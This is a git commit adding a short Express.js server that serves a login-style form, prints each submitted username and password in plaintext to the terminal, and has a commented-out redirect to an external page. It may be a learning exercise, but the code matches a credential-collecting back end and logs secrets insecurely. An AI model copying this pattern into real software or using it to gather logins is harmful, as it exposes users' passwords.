d52d1c810a1e44c261e5795b6b77280d9c4b669e
Gmoges <156920398+Gmoges@users.noreply.github.com>
2025-03-12 10:44:58 +0300

    first commit

---
+++ server.js
@@ -0,0 +1,34 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const readlineSync = require('readline-sync');
+const app = express();
+const port = 2119;
+
+// Middleware to parse form data
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// Serve the form page (ensure you have a form.html file in the public folder)
+app.get('/', (req, res) => {
+  res.sendFile(__dirname + '/final_unity/front/form.html');
+});
+
+// Handle form submission
+app.post('/submit', (req, res) => {
+  // Get form data
+  const { user_name, password, } = req.body;
+
+  // Process form data (output to terminal)
+  console.log('\nForm Data Submitted:');
+  console.log(`User_Name: ${user_name}`);
+  console.log(`Password: ${password}`);
+
+  // Respond back to the client
+
+  //   res.redirect("https://gmoges.github.io/host_try1/back_front/result/index.html");
+  res.send('Form submitted successfully! Check the terminal for data.');
+});
+
+// Start the server
+app.listen(port, () => {
+  console.log(`Server is running on http://localhost:${port}`);
+});
